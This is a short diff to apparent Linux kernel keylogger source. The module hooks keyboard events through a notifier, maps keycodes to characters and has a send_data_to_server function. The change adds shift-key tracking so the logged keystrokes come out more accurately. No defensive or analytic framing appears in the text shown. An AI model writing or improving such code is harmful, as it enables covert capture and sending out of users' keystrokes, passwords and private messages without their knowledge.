@@ -90,7 +90,11 @@ static int send_data_to_server(const char *data)
 static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
 {
     struct keyboard_notifier_param *kp = param;
-
+    
+    if (kp->value == KEY_LEFTSHIFT || kp->value == KEY_RIGHTSHIFT) {
+        shift_pressed = kp->down;  // Update shift state when the key is pressed or released
+    }
+    
     if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
         const char *key_char = keymap[kp->value];
         if (key_char) {
